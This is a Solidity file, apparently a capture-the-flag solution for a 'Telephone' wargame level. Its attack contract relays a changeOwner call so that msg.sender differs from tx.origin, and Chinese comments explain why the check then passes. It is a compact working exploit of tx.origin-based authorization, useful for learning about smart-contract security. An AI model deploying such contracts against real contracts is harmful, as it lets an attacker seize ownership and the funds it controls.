// src/TelephoneAttack.sol
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;
    
    constructor(address _target) {
        target = ITelephone(_target);
    }
    
    function attack(address _newOwner) external {
        // msg.sender此时是TelephoneAttack合约地址
        // tx.origin是你的钱包地址
        // 两者不同，条件满足
        target.changeOwner(_newOwner);
    }
}